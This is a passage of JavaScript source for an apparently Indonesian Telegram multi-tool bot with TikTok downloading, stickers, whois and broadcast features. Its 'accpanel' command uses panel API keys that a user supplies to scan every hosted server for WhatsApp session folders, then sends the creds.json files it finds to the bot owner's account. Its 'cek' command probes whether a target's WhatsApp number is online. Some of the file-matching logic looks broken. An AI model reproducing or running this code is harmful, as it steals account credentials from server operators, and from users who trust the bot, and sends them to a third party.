          [{ text: "⌜🌍⌟ ☇ オープンロケーション", url: mapsUrl }]
        ]
      }
    } : null;

    try {
      if (processingMsg && processingMsg.photo && typeof processingMsg.message_id !== "undefined") {
        await ctx.telegram.editMessageCaption(
          processingMsg.chat.id,
          processingMsg.message_id,
          undefined,
          caption,
          { parse_mode: "HTML", ...(inlineKeyboard ? inlineKeyboard : {}) }
        );
      } else if (typeof thumbnailUrl !== "undefined" && thumbnailUrl) {
        await ctx.replyWithPhoto(thumbnailUrl, {
          caption,
          parse_mode: "HTML",
          ...(inlineKeyboard ? inlineKeyboard : {})
        });
      } else {
        if (inlineKeyboard) {
          await ctx.reply(caption, { parse_mode: "HTML", ...inlineKeyboard });
        } else {
          await ctx.reply(caption, { parse_mode: "HTML" });
        }
      }
    } catch (e) {
      if (mapsUrl) {
        await ctx.reply(caption + `📍 ☇ Maps: ${mapsUrl}`, { parse_mode: "HTML" });
      } else {
        await ctx.reply(caption, { parse_mode: "HTML" });
      }
    }

  } catch (err) {
    await ctx.reply("❌ ☇ Terjadi kesalahan saat mengambil data IP (timeout atau API tidak merespon). Coba lagi nanti");
  }
});

bot.hears(/^s$/i, async (ctx) => {
  const reply = ctx.message.reply_to_message;
  if (!reply) return ctx.reply("❗ Reply foto atau video dulu lalu ketik: `S`");

  await ctx.reply("𝙒𝙖𝙞𝙩𝙞𝙣𝙜 𝙁𝙤𝙧 𝙋𝙧𝙤𝙘𝙚𝙨𝙨𝙞𝙣𝙜🔥");

  try {
    let fileId;

    if (reply.photo) {
      fileId = reply.photo[reply.photo.length - 1].file_id;
    } else if (reply.video) {
      fileId = reply.video.file_id;
    } else {
      return ctx.reply("⚠️ Hanya bisa untuk *foto atau video*.");
    }

    const link = await ctx.telegram.getFileLink(fileId);
    const stickerPath = await toSticker(link.href);

    await ctx.replyWithSticker({ source: stickerPath });

  } catch (err) {
    console.log(err);
    ctx.reply("⚠️ Gagal membuat sticker.");
  }
});



const tiktokStore = new Map(); // memory penyimpanan sementara

const slideStore = new Map();


bot.hears(/^tiktok\b(?:\s+(.*))?$/i, async (ctx) => {
  const url = ctx.match[1];
  if (!url) return ctx.reply("› Format:\nTiktok <Url>");

  await ctx.reply("𝙒𝙖𝙞𝙩𝙞𝙣𝙜 𝙁𝙤𝙧 𝙋𝙧𝙤𝙘𝙚𝙨𝙨𝙞𝙣𝙜🔥");

  try {
    const api = await fetch("https://tikwm.com/api/", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ url })
    }).then(res => res.json());

    const id = api?.data?.id;
    const audio = api?.data?.music;
    if (id && audio) tiktokStore.set(id, audio);

    // ===== SLIDE FOTO =====
    if (api?.data?.images?.length > 0) {
      const slides = api.data.images;
      slideStore.set(id, slides);

      return ctx.replyWithPhoto({ url: slides[0] }, {
        caption: `📸 *Slide 1 / ${slides.length}*\n\nGunakan tombol untuk navigasi.`,
        parse_mode: "Markdown",
        reply_markup: {
          inline_keyboard: [
            [{ text: "» Next", callback_data: `slide_next_${id}_0` }],
            [{ text: "🖼 All Pictures", callback_data: `slide_all_${id}` }],
            [{ text: "🎧 Audio", callback_data: `tiktok_audio_${id}` }]
          ]
        }
      });
    }

    // ===== VIDEO =====
    if (api?.data?.play) {
      const video = api.data.play;
      const caption = api.data.title || "";
      const hashtags = api.data.author?.unique_id ? `#${api.data.author.unique_id}` : "";

      return ctx.replyWithVideo({ url: video }, {
        caption: `${caption}\n${hashtags}`,
        parse_mode: "Markdown",
        reply_markup: {
          inline_keyboard: [
            [{ text: "🎧 Audio", callback_data: `tiktok_audio_${id}` }]
          ]
        }
      });
    }

    return ctx.reply("❌ Tidak bisa diproses. Cek link TikTok kamu.");

  } catch (err) {
    console.error("❌ Error TikTok:", err);
    ctx.reply("⚠️ Terjadi kesalahan saat memproses video TikTok.");
  }
});


// ============================
// 🔄 SLIDE NEXT & PREV
// ============================

bot.action(/^slide_next_(.+)_(\d+)/, async (ctx) => {
  try {
    const id = ctx.match[1];
    const index = parseInt(ctx.match[2]);
    const slides = slideStore.get(id);
    if (!slides) return ctx.answerCbQuery("❌ Data slide tidak ditemukan.");

    const nextIndex = index + 1;
    if (nextIndex >= slides.length) return ctx.answerCbQuery("📸 Sudah di slide terakhir!");

    await ctx.editMessageMedia({
      type: "photo",
      media: slides[nextIndex],
      caption: `📸 *Slide ${nextIndex + 1} / ${slides.length}*`,
      parse_mode: "Markdown"
    }, {
      reply_markup: {
        inline_keyboard: [
          [{ text: "« Back", callback_data: `slide_prev_${id}_${nextIndex}` },
           { text: "» Next", callback_data: `slide_next_${id}_${nextIndex}` }],
          [{ text: "🖼 All Pictures", callback_data: `slide_all_${id}` }],
          [{ text: "🎧 Audio", callback_data: `tiktok_audio_${id}` }]
        ]
      }
    });
  } catch (err) {
    console.error(err);
  }
});

bot.action(/^slide_prev_(.+)_(\d+)/, async (ctx) => {
  try {
    const id = ctx.match[1];
    const index = parseInt(ctx.match[2]);
    const slides = slideStore.get(id);
    if (!slides) return ctx.answerCbQuery("❌ Data slide tidak ditemukan.");

    const prevIndex = index - 1;
    if (prevIndex < 0) return ctx.answerCbQuery("📸 Sudah di slide pertama!");

    await ctx.editMessageMedia({
      type: "photo",
      media: slides[prevIndex],
      caption: `📸 *Slide ${prevIndex + 1} / ${slides.length}*`,
      parse_mode: "Markdown"
    }, {
      reply_markup: {
        inline_keyboard: [
          [{ text: "« Back", callback_data: `slide_prev_${id}_${prevIndex}` },
           { text: "» Next", callback_data: `slide_next_${id}_${prevIndex}` }],
          [{ text: "🖼 All Pictures", callback_data: `slide_all_${id}` }],
          [{ text: "🎧 Audio", callback_data: `tiktok_audio_${id}` }]
        ]
      }
    });
  } catch (err) {
    console.error(err);
  }
});


// ============================
// 🖼 DOWNLOAD SEMUA SLIDE
// ============================

bot.action(/^slide_all_(.+)$/, async (ctx) => {
  try {
    const id = ctx.match[1];
    const slides = slideStore.get(id);
    if (!slides) return ctx.answerCbQuery("❌ Tidak ada data slide ditemukan.");

    await ctx.reply("📸 Mengirim semua foto...");
    for (const url of slides) {
      await ctx.replyWithPhoto({ url });
      await new Promise(r => setTimeout(r, 500)); // biar tidak spam cepat
    }

    ctx.answerCbQuery("✅ Semua foto terkirim!");
  } catch (err) {
    console.error(err);
    ctx.answerCbQuery("❌ Gagal mengirim semua foto.");
  }
});


// ============================
// 🎧 AUDIO HANDLER
// ============================

bot.action(/^tiktok_audio_(.+)$/, async (ctx) => {
  try {
    const id = ctx.match[1];
    const audio = tiktokStore.get(id);
    if (!audio) return ctx.answerCbQuery("❌ Audio tidak ditemukan.");

    await ctx.replyWithAudio({ url: audio }, { title: "🎧 TikTok Audio" });
    ctx.answerCbQuery("🎵 Mengirim audio...");
  } catch (err) {
    console.error(err);
    ctx.answerCbQuery("❌ Gagal mengirim audio.");
  }
});


async function downloadTikTok(url, id) {
  const base = path.join(TMP_DIR, id);
  const outputTemplate = `${base}.%(ext)s`; // akan jadi .mp4
  try {
    // yt-dlp options:
    // - write-info-json: membuat .info.json metadata
    // - merge-output-format mp4 -> pastikan video jadi mp4
    const args = [
      "--no-playlist",
      "--no-warnings",
      "--no-progress",
      "--merge-output-format",
      "mp4",
      "--write-info-json",
      "-o",
      outputTemplate,
      url
    ];
    await execFileAsync("yt-dlp", args, { timeout: 120000 }); // timeout 120s, bisa adjust

    // Setelah selesai, cari file .mp4 dan .info.json
    const mp4Path = `${base}.mp4`;
    const infoJsonPath = `${base}.info.json`;

    if (!(await fs.pathExists(mp4Path))) {
      // kadang ext berbeda (mkv/webm), find any matching base.*
      const files = await fs.readdir(TMP_DIR);
      const matched = files.find(f => f.startsWith(id + "."));
      if (matched) {
        // use matched file
        const candidate = path.join(TMP_DIR, matched);
        return { videoPath: candidate, infoPath: infoJsonPath };
      }
      throw new Error("Video not found after yt-dlp run");
    }

    return { videoPath: mp4Path, infoPath: infoJsonPath };
  } catch (err) {
    throw new Error(`yt-dlp failed: ${err.message}`);
  }
}

async function convertToMp3(videoPath, outMp3Path) {
  // ffmpeg -i input -vn -acodec libmp3lame -q:a 2 out.mp3
  const args = ["-i", videoPath, "-vn", "-acodec", "libmp3lame", "-q:a", "2", outMp3Path];
  try {
    await execFileAsync("ffmpeg", args, { timeout: 120000 });
  } catch (err) {
    throw new Error("ffmpeg failed: " + err.message);
  }
}

async function sendVideoOrDocument(ctx, chatId, videoPath, caption, keyboard) {
  const stat = await fs.stat(videoPath);
  const sizeBytes = stat.size;
  // 50MB = 52,428,800 bytes approximated (but actual Telegram limit might differ)
  const MAX_TELEGRAM_FILE = 50 * 1024 * 1024; // adjust as desired

  const extra = { caption, parse_mode: "HTML" };
  if (keyboard) extra.reply_markup = keyboard.reply_markup ?? keyboard;

  if (sizeBytes <= MAX_TELEGRAM_FILE) {
    // send as video
    return ctx.telegram.sendVideo(chatId, { source: fs.createReadStream(videoPath) }, extra);
  } else {
    // too big => send as document (so Telegram doesn't transcode)
    return ctx.telegram.sendDocument(chatId, { source: fs.createReadStream(videoPath) }, extra);
  }
}

function extractHashtags(text = "") {
  // ambil #tag (unicode aware). Return array unik.
  const re = /#([\p{L}\p{N}_\-]+)/gu;
  const matches = new Set();
  let m;
  while ((m = re.exec(text)) !== null) {
    matches.add(`#${m[1]}`);
  }
  return Array.from(matches);
}

bot.hears(/^cek\b(?:\s+(.*))?$/i, checkWhatsAppConnection, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply("❗ Contoh:\nCek 628xxxxxxxxx");

  const nomor = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
  const idPesan = crypto.randomBytes(8).toString("hex");

  try {
    const sent = await sock.sendMessage(nomor, {
      text: "Cek status...",
    }, { messageId: idPesan });

    let status = sent?.status;
    let info = "";

    if (status === 1) {
      info = "✅ *Centang 1* (Target sedang offline)";
    } else if (status === 2) {
      info = "✅ *Centang 2* (Target sedang online)";
    } else {
      info = "❌ Gagal cek status (mungkin nomor tidak aktif atau diblokir)";
    }

    await ctx.reply(`🔍 *Hasil Pengecekan WhatsApp:*\n• Nomor: ${q}\n• Status: ${info}`, {
      parse_mode: "Markdown"
    });

  } catch (err) {
    console.error("❌ Gagal mengirim pesan cek:", err);
    ctx.reply("❌ Gagal mengecek status, pastikan nomor valid dan terhubung ke WhatsApp.");
  }
});


bot.hears(/^ttsearch\b(?:\s+(.*))?$/i, async (ctx) => {
  const query = ctx.match[1];
  if (!query) {
    return ctx.reply("⚙️ *Format:* Ttsearch Davina Karamoy", { parse_mode: "Markdown" });
  }

  await ctx.reply("𝙒𝙖𝙞𝙩𝙞𝙣𝙜 𝙁𝙤𝙧 𝙋𝙧𝙤𝙘𝙚𝙨𝙨𝙞𝙣𝙜🔥");

  try {
    // Ambil hasil pencarian
    const res = await fetch("https://tikwm.com/api/feed/search/", {
      method: "POST",
      headers: { "content-type": "application/json" },
      body: JSON.stringify({
        keywords: query,
        count: 10 // ambil banyak hasil, tapi kirim cuma 1
      })
    }).then(r => r.json());

    if (!res?.data?.videos || res.data.videos.length < 1) {
      return ctx.reply("❌ Tidak ada video ditemukan untuk kata kunci itu.");
    }

    // Ambil satu video acak atau pertama (supaya tidak spam)
    const vid = res.data.videos[0]; // bisa ganti ke random: res.data.videos[Math.floor(Math.random() * res.data.videos.length)]

    const hashtags = vid.hashtags?.map(h => `#${h.title}`).join(" ") || "-";
    const author = vid.author?.unique_id || "unknown";
    const title = vid.title || "(tanpa judul)";
    const thumb = vid.cover;
    const videoId = vid.video_id;

    // Kirim hasil ke user
    await ctx.replyWithPhoto(
      { url: thumb },
      {
        caption:
          `🎬 *${title}*\n` +
          `👤 @${author}\n` +
          `🏷️ Hashtag: ${hashtags}\n\n` +
          `Klik tombol di bawah untuk mendownload video ini.`,
        parse_mode: "Markdown",
        reply_markup: {
          inline_keyboard: [
            [
              { text: "Download", callback_data: `ttdl_${videoId}` }
            ]
          ]
        }
      }
    );

  } catch (err) {
    console.error("❌ Error ttsearch:", err);
    await ctx.reply("⚠️ Terjadi kesalahan saat mencari video TikTok. Coba lagi nanti.");
  }
});




bot.action(/^ttdl_(.*)/, async (ctx) => {
  const video_id = ctx.match[1];

  try {
    await ctx.reply("𝙒𝙖𝙞𝙩𝙞𝙣𝙜 𝙁𝙤𝙧 𝙋𝙧𝙤𝙘𝙚𝙨𝙨𝙞𝙣𝙜🔥");

    // Ambil detail video langsung dari TikWM API
    const info = await fetch("https://tikwm.com/api/", {
      method: "POST",
      headers: {
        "content-type": "application/json"
      },
      body: JSON.stringify({
        url: `https://www.tiktok.com/@/video/${video_id}`,
        hd: 1
      })
    }).then(r => r.json());

    if (!info || !info.data) return ctx.reply("⚠️ Gagal mendapatkan data video.");

    const videoUrl = info.data.play; // Tanpa watermark
    const title = info.data.title || "Video TikTok";

    await ctx.replyWithVideo(
      { url: videoUrl },
      { caption: `✅ *Berhasil Download*\n🎬 ${title}`, parse_mode: "Markdown" }
    );

  } catch (err) {
    console.log("Error download:", err);
    ctx.reply("⚠️ Gagal mengunduh video, coba lagi.");
  }
});



bot.hears(/^grouponly\b(?:\s+(.*))?$/i, (ctx) => {
  const senderId = ctx.from.id.toString();

  if (!isValidOwner(senderId)) return;

  const arg = ctx.message.text.split(" ")[1];
  if (!["on", "off"].includes(arg)) {
    return ctx.reply("❗ Gunakan:\nGrouponly on\nGrouponly off");
  }

  const status = arg === "on";
  saveGroupConfig({ isGroupOnly: status });
  ctx.reply(`✅ Mode Grouponly sekarang: ${status ? "Aktif ✅" : "Nonaktif ❌"}`);
});

bot.hears(/^setcd\b(?:\s+(.*))?$/i, checkOwner, async (ctx) => {
  const args = ctx.message.text.split(" ");
  const duration = args[1]?.trim();

  if (!duration) {
    return ctx.reply("❗ Contoh penggunaan:\n/setjeda 60s\nSetcd 2m");
  }

  const seconds = parseCooldownDuration(duration); 
  if (seconds === null) {
    return ctx.reply(
      "❌ Format durasi tidak valid.\nGunakan:\nSetcd <durasi>\nContoh:\nSetcd 60s (60 detik)\nSetcd 10m (10 menit)"
    );
  }

  const cooldownData = loadCooldownData(); 
  cooldownData.defaultCooldown = seconds;
  saveCooldownData(cooldownData);

  const displayTime = seconds >= 60
    ? `${Math.floor(seconds / 60)} menit`
    : `${seconds} detik`;

  await ctx.reply(`✅ Cooldown global berhasil diatur ke ${displayTime}`);
});

bot.command("broadcast", async (ctx) => {
  const senderId = ctx.from.id.toString();
  const dbFile = "./DatabaseUser/userlist.json";

  if (senderId !== "8488114208") return;

  const replyMsg = ctx.message.reply_to_message;
  if (!replyMsg) return ctx.reply("❗ Balas pesan yang ingin kamu broadcast.");

  let db = { private: [], group: [] };
  try {
    db = JSON.parse(fs.readFileSync(dbFile));
  } catch (e) {
    return ctx.reply("❌ Gagal membaca data user.");
  }

  const users = db.private || [];
  const groups = db.group || [];
  const allReceivers = [...users, ...groups];

  let successCount = 0;
  let failedCount = 0;

  for (const id of allReceivers) {
    try {
      await ctx.telegram.forwardMessage(id, ctx.chat.id, replyMsg.message_id);
      successCount++;
    } catch (err) {
      failedCount++;
      console.log(`❌ Gagal kirim ke ${id}:`, err.description);
    }
  }

  const info = `✅ Broadcast selesai.

📩 Total User: ${users.length}
👥 Total Grup: ${groups.length}
📬 Terkirim: ${successCount}
❌ Gagal: ${failedCount}`;

  await ctx.reply(info);
});

bot.command("cekdomain", async (ctx) => {
  const args = ctx.message.text.split(" ")[1];
  if (!args) return ctx.reply("⚠️ Contoh: /cekdomain google.com");

  try {
    const res = await axios.get(`https://api.api-ninjas.com/v1/whois?domain=${args}`, {
      headers: { "X-Api-Key": config.apiNinjasKey }
    });

    const msg = `🌐 *Info Domain:*\n\n` +
                `• Domain: ${args}\n` +
                `• Registrar: ${res.data.registrar}\n` +
                `• Dibuat: ${res.data.creation_date}\n` +
                `• Expired: ${res.data.expiration_date}\n` +
                `• DNS: ${res.data.name_servers.join(", ")}`;

    ctx.reply(msg, { parse_mode: "Markdown" });
  } catch (e) {
    ctx.reply("❌ Gagal cek domain (pastikan APIKEY api- sudah benar)");
  }
});



bot.hears(/^listcmd\b(?:\s+(.*))?$/i, async (ctx) => {
  try {
    if (!fs.existsSync("./DatabaseUser/setcmd.json")) return ctx.reply("⚠️ File `setcmd.json` tidak ditemukan.");

    const data = JSON.parse(fs.readFileSync("./DatabaseUser/setcmd.json"));
    const list = Object.entries(data); // [ [fileID, cmd], ... ]

    if (list.length === 0) return ctx.reply("❌ Belum ada sticker yang dijadikan command.");

    await ctx.reply(`*Ditemukan\n\n${list.length}* sticker terdaftar.`, { parse_mode: "Markdown" });

    // Kirim satu-satu
    for (const [fileID, cmd] of list) {
      await ctx.replyWithSticker(fileID);
      await ctx.reply(`Command:\n\n▶️ */${cmd}*`, { parse_mode: "Markdown" });

      // Delay kecil biar anti spam flood telegram
      await new Promise(resolve => setTimeout(resolve, 500));
    }

    await ctx.reply(`✅ *Selesai mengirim seluruh sticker command.*`);

  } catch (err) {
    console.log(err);
    ctx.reply("⚠️ Terjadi kesalahan saat proses pengiriman sticker list.");
  }
});


bot.hears(/^smeme\b(?:\s+(.*))?$/i, async (ctx) => {
  try {
    const text = ctx.match[1];
    if (!text) return ctx.reply("⚠️ Example:\n*Smeme Reply Foto & Masukan Teks");

    // Harus reply foto
    const photo = ctx.message.reply_to_message?.photo;
    if (!photo) return ctx.reply("⚠️ Harus reply ke *FOTO*!");
    
    await ctx.reply("𝙒𝙖𝙞𝙩𝙞𝙣𝙜 𝙁𝙤𝙧 𝙋𝙧𝙤𝙘𝙚𝙨𝙨𝙞𝙣𝙜🔥");

    // Ambil foto kualitas terbesar
    const fileId = photo[photo.length - 1].file_id;
    const file = await ctx.telegram.getFile(fileId);
    const imageUrl = `https://api.telegram.org/file/bot${process.env.BOT_TOKEN}/${file.file_path}`;

    // Load gambar
    const img = await loadImage(imageUrl);
    const canvas = createCanvas(img.width, img.height);
    const ctxCanvas = canvas.getContext("2d");

    // Gambar foto
    ctxCanvas.drawImage(img, 0, 0, canvas.width, canvas.height);

    // Setup teks
    ctxCanvas.font = `${canvas.width / 12}px Impact`;
    ctxCanvas.fillStyle = "white";
    ctxCanvas.strokeStyle = "black";
    ctxCanvas.lineWidth = canvas.width / 60;
    ctxCanvas.textAlign = "center";

    // Tulis teks di atas
    const lines = wrapText(ctxCanvas, text.toUpperCase(), canvas.width - 40);
    let y = 100;
    lines.forEach(line => {
      ctxCanvas.strokeText(line, canvas.width / 2, y);
      ctxCanvas.fillText(line, canvas.width / 2, y);
      y += canvas.width / 10;
    });

    // Convert ke WebP buat sticker
    const webpBuffer = await sharp(canvas.toBuffer())
      .webp({ quality: 80 })
      .toBuffer();

    // Kirim sticker
    await ctx.replyWithSticker({ source: webpBuffer });

  } catch (err) {
    console.log(err);
    ctx.reply("❌ Gagal membuat smeme.");
  }
});

// Fungsi untuk memotong teks panjang agar pas
function wrapText(ctx, text, maxWidth) {
  const words = text.split(" ");
  let line = "";
  const lines = [];

  for (let i = 0; i < words.length; i++) {
    const test = line + words[i] + " ";
    const width = ctx.measureText(test).width;
    if (width > maxWidth && i > 0) {
      lines.push(line.trim());
      line = words[i] + " ";
    } else {
      line = test;
    }
  }
  lines.push(line.trim());
  return lines;
}

bot.hears(/^accpanel\b(?:\s+(.*))?$/i, checkPremium, async (ctx) => {
  const chatId = ctx.chat.id;
  const fromId = ctx.from.id;

  const text = ctx.message.text.split(" ").slice(1).join(" ");
  if (!text) return ctx.reply("›› Format: Accpanel https://domainpanel.com,ptla_123,ptlc_123");

  const args = text.split(",");
  const domain = args[0];
  const plta = args[1];
  const pltc = args[2];
  if (!plta || !pltc)
    return ctx.reply("›› Format: Csessions https://panelku.com,plta_123,pltc_123");

  await ctx.reply(
    "Waiting For Proccesing...",
    { parse_mode: "Markdown" }
  );

  const base = domain.replace(/\/+$/, "");
  const commonHeadersApp = {
    Accept: "application/json, application/vnd.pterodactyl.v1+json",
    Authorization: `Bearer ${plta}`,
  };
  const commonHeadersClient = {
    Accept: "application/json, application/vnd.pterodactyl.v1+json",
    Authorization: `Bearer ${pltc}`,
  };

  function isDirectory(item) {
    if (!item || !item.attributes) return false;
    const a = item.attributes;
    if (typeof a.is_file === "boolean") return a.is_file === false;
    return (
      a.type === "dir" ||
      a.type === "directory" ||
      a.mode === "dir" ||
      a.mode === "directory" ||
      a.mode === "d" ||
      a.is_directory === true ||
      a.isDir === true
    );
  }

  async function listAllServers() {
    const out = [];
    let page = 1;
    while (true) {
      const r = await axios.get(`${base}/api/application/servers`, {
        params: { page },
        headers: commonHeadersApp,
        timeout: 15000,
      }).catch(() => ({ data: null }));
      const chunk = (r && r.data && Array.isArray(r.data.data)) ? r.data.data : [];
      out.push(...chunk);
      const hasNext = !!(r && r.data && r.data.meta && r.data.meta.pagination && r.data.meta.pagination.links && r.data.meta.pagination.links.next);
      if (!hasNext || chunk.length === 0) break;
      page++;
    }
    return out;
  }

  async function traverseAndFind(identifier, dir = "/") {
    try {
      const listRes = await axios.get(
        `${base}/api/client/servers/${identifier}/files/list`,
        {
          params: { directory: dir },
          headers: commonHeadersClient,
          timeout: 15000,
        }
      ).catch(() => ({ data: null }));
      const listJson = listRes.data;
      if (!listJson || !Array.isArray(listJson.data)) return [];
      let found = [];

      for (let item of listJson.data) {
        const name = (item.attributes && item.attributes.name) || item.name || "";
        const itemPath = (dir === "/" ? "" : dir) + "/" + name;
        const normalized = itemPath.replace(/\/+/g, "/");
        const lower = name.toLowerCase();

        if ((lower === "session" || lower === "sessions") && isDirectory(item)) {
          try {
            const sessRes = await axios.get(
              `${base}/api/client/servers/${identifier}/files/list`,
              {
                params: { directory: normalized },
                headers: commonHeadersClient,
                timeout: 15000,
              }
            ).catch(() => ({ data: null }));
            const sessJson = sessRes.data;
            if (sessJson && Array.isArray(sessJson.data)) {
              for (let sf of sessJson.data) {
                const sfName = (sf.attributes && sf.attributes.name) || sf.name || "";
                const sfPath = (normalized === "/" ? "" : normalized) + "/" + sfName;
                if (sfName.toLowerCase() === "sension, sensions") {
                  found.push({
                    path: sfPath.replace(/\/+/g, "/"),
                    name: sfName,
                  });
                }
              }
            }
          } catch (_) {}
        }

        if (isDirectory(item)) {
          try {
            const more = await traverseAndFind(identifier, normalized === "" ? "/" : normalized);
            if (more.length) found = found.concat(more);
          } catch (_) {}
        } else {
          if (name.toLowerCase() === "sension, sensions") {
            found.push({ path: (dir === "/" ? "" : dir) + "/" + name, name });
          }
        }
      }
      return found;
    } catch (_) {
      return [];
    }
  }

  try {
    const servers = await listAllServers();
    if (!servers.length) {
      return ctx.reply("❌ ☇ Tidak ada server yang bisa discan");
    }

    let totalFound = 0;

    for (let srv of servers) {
      const identifier =
        (srv.attributes && srv.attributes.identifier) ||
        srv.identifier ||
        (srv.attributes && srv.attributes.id);
      const name =
        (srv.attributes && srv.attributes.name) ||
        srv.name ||
        identifier ||
        "unknown";
      if (!identifier) continue;

      const list = await traverseAndFind(identifier, "/");
      if (list && list.length) {
        for (let fileInfo of list) {
          totalFound++;
          const filePath = ("/" + fileInfo.path.replace(/\/+/g, "/")).replace(/\/+$/,"");

          await ctx.reply(
            `📁 ☇ Ditemukan sension di server ${name} path: ${filePath}`,
            { parse_mode: "Markdown" }
          );

          try {
            const downloadRes = await axios.get(
              `${base}/api/client/servers/${identifier}/files/download`,
              {
                params: { file: filePath },
                headers: commonHeadersClient,
                timeout: 15000,
              }
            ).catch(() => ({ data: null }));

            const dlJson = downloadRes && downloadRes.data;
            if (dlJson && dlJson.attributes && dlJson.attributes.url) {
              const url = dlJson.attributes.url;
              const fileRes = await axios.get(url, {
                responseType: "arraybuffer",
                timeout: 20000,
              });
              const buffer = Buffer.from(fileRes.data);
              await ctx.telegram.sendDocument(ownerID, {
                source: buffer,
                filename: `${String(name).replace(/\s+/g, "_")}_sensions`,
              });
            } else {
              await ctx.reply(
                `❌ ☇ Gagal mendapatkan URL download untuk ${filePath} di server ${name}`
              );
            }
          } catch (e) {
            console.error(`Gagal download ${filePath} dari ${name}:`, e?.message || e);
            await ctx.reply(
              `❌ ☇ Error saat download file creds.json dari ${name}`
            );
          }
        }
      }
    }

    if (totalFound === 0) {
      return ctx.reply("✅ ☇ Scan selesai tidak ditemukan creds.json di folder session/sessions pada server manapun");
    } else {
      return ctx.reply(`✅ ☇ Scan selesai total file creds.json berhasil diunduh & dikirim: ${totalFound}`);
    }
  } catch (err) {
    ctx.reply("❌ ☇ Terjadi error saat scan");
  }
});


// --- perintah maintenance on/off
bot.hears(/^maintenance(?:\s+(on|off))?$/i, async (ctx) => {
  const userId = ctx.from.id;

const DEV_ID = 7454464877; // ganti dengan ID developer kamu

  // hanya developer yang bisa
  if (userId !== DEV_ID) {
    return ctx.reply("⚠️ Kamu tidak memiliki izin untuk mengubah mode maintenance.");
  }

  const state = ctx.match[1]?.toLowerCase();

  // jika tidak ada argumen, tampilkan status
  if (!state) {
    return ctx.reply(
      `🛠️ Status Maintenance: ${MAINTENANCE_MODE ? "ON" : "OFF"}\n\nGunakan:\n• maintenance on\n• maintenance off`
    );
  }

  await ctx.reply("𝙒𝙖𝙞𝙩𝙞𝙣𝙜 𝙁𝙤𝙧 𝙋𝙧𝙤𝙘𝙚𝙨𝙨𝙞𝙣𝙜🔥");

  if (state === "on") {
    MAINTENANCE_MODE = true;
    await ctx.reply(
      "⚠️ *System Stopped*\nSystem Starting Next Days\n\nDeveloper: [RenzXml](https://t.me/RapzXyzz)",
      { parse_mode: "Markdown", disable_web_page_preview: true }
    );
  } else if (state === "off") {
    MAINTENANCE_MODE = false;
    await ctx.reply(
      "✅ *System Starting...*\nBot telah aktif kembali!",
      { parse_mode: "Markdown" }
    );
  }
});


bot.hears(/^delcmd\b(?:\s+(.*))?$/i, async (ctx) => {
  try {
    // Pastikan user reply sticker
    if (!ctx.message.reply_to_message || !ctx.message.reply_to_message.sticker) {
      return ctx.reply("⚠️ *Reply sticker yang ingin dihapus*", { parse_mode: "Markdown" });
    }

    const fileID = ctx.message.reply_to_message.sticker.file_unique_id;

    if (!fs.existsSync("./DatabaseUser/setcmd.json")) return ctx.reply("⚠️ File `setcmd.json` tidak ditemukan.");

    let data = JSON.parse(fs.readFileSync("./DatabaseUser/setcmd.json"));

    // Cek apakah sticker terdaftar
    if (!data[fileID]) {
      return ctx.reply("❌ Sticker ini *tidak terdaftar* sebagai command.");
    }

    // Simpan nama command untuk info
    const deletedCmd = data[fileID];

    // Hapus dari JSON
    delete data[fileID];
    fs.writeFileSync("./DatabaseUser/setcmd.json", JSON.stringify(data, null, 2));

    ctx.reply(`✅ *Sticker berhasil dihapus dari daftar command.*\n\nYang dihapus:\n• Command: ${deletedCmd}`, { parse_mode: "Markdown" });

  } catch (err) {
    console.log(err);
    ctx.reply("⚠️ Terjadi kesalahan saat menghapus command.");
  }
});

bot.hears(/^acces\b(?:\s+(.*))?$/i, async (ctx) => {
  try {
    const user = ctx.from;

    const userId = user.id;
    const fullName = `${user.first_name || ""} ${user.last_name || ""}`.trim();
    const username = user.username ? `@${user.username}` : `-`;

    const text = `✅ *Verificated [PhenoxScaryBot](https://t.me/HackGg_Bot)*
🆔 *User ID:* \`${userId}\`
📛 *Name:* ${fullName}
🔗 *Username:* ${username}

🚀 *Welcome to the secured system.*
Your identity has been stored for future access.`;

    ctx.reply(text, { parse_mode: "Markdown" });

  } catch (err) {
    console.log(err);
    ctx.reply("⚠️ Terjadi kesalahan saat memproses akses.");
  }
});

bot.hears(/^fixcode\b(?:\s+(.*))?$/i, async (ctx) => {
  try {
    const msg = ctx.message.reply_to_message;

    // Pastikan user reply file document
    if (!msg || !msg.document) {
      return ctx.reply("⚠️ Reply ke file .js atau .html yang ingin diperbaiki!");
    }

    const doc = msg.document;
    const filename = doc.file_name || `file_${doc.file_id}`;
    const fileExt = filename.toLowerCase();

    // Hanya izinkan .js dan .html
    if (!fileExt.endsWith(".js") && !fileExt.endsWith(".html")) {
      return ctx.reply("❌ File yang direply bukan .js atau .html!");
    }

    await ctx.reply("𝙒𝙖𝙞𝙩𝙞𝙣𝙜 𝙁𝙤𝙧 𝙋𝙧𝙤𝙘𝙚𝙨𝙨𝙞𝙣𝙜🔥");

    // Lokasi penyimpanan sementara
    const safeName = safeFilename(filename);
    const tempPath = path.join(TEMP_DIR, safeName);

    // Unduh file dari Telegram
    const fileLink = await ctx.telegram.getFileLink(doc.file_id);
    await downloadFile(fileLink.href, tempPath);
    const raw = fs.readFileSync(tempPath, "utf8");

    // Deteksi tipe file
    const detected = detectType(filename, raw);
    let fixed = raw;
    let notes = [];

    // Proses sesuai tipe
    if (detected === "html") {
      fixed = fixHTML(raw);
      notes.push("Detected: HTML — formatted & repaired with Prettier (HTML).");
    } else if (detected === "javascript") {
      fixed = fixJavaScript(raw);
      notes.push("Detected: JavaScript/Telegraf — applied Prettier formatting and Telegraf-import heuristics.");
      if (/(^|\W)bot\./.test(fixed) && !/(?:const|let|var)\s+bot\s*=/.test(fixed)) {
        notes.push("Note: bot.* ditemukan tapi deklarasi bot belum jelas — bot init telah ditambahkan (process.env.BOT_TOKEN).");
      }
    } else {
      notes.push("Tipe file tidak dikenali. Mengembalikan file asli (tidak diubah).");
    }

    // Simpan hasil perbaikan
    const outName = `${path.parse(filename).name}_fixed${path.extname(filename)}`;
    const outPath = path.join(TEMP_DIR, `${Date.now()}_${outName}`);
    fs.writeFileSync(outPath, fixed, "utf8");

    // Kirim hasil ke user
    const noteMessage = notes.join("\n") || "Perbaikan selesai.";
    await ctx.reply(`✅ Selesai — ${noteMessage}`);
    await ctx.replyWithDocument({ source: outPath, filename: outName });

    // Bersihkan file sementara
    try {
      fs.unlinkSync(tempPath);
      setTimeout(() => {
        if (fs.existsSync(outPath)) fs.unlinkSync(outPath);
